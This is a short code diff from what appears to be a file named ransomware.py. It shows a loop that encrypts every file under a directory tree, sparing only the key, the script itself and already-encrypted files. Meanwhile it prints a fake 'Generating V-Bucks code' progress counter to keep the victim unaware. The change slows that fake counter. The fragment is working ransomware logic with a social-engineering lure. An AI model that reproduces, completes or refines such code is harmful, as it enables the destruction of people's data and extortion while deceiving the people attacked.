@@ -43,7 +43,7 @@ def encryptFiles(key):
         for file in files:
             if(not (file == 'key.key' or file == 'ransomware.py' or '.encrypted' in file)):
                 print("Generating V-Bucks code: " + str(100 - progress) + "%")
-                progress = progress * 0.75
+                progress = progress * 0.9999
                 encryptFile(root + '\\' + file, key)
 
 def encryptFile(filePath, key):
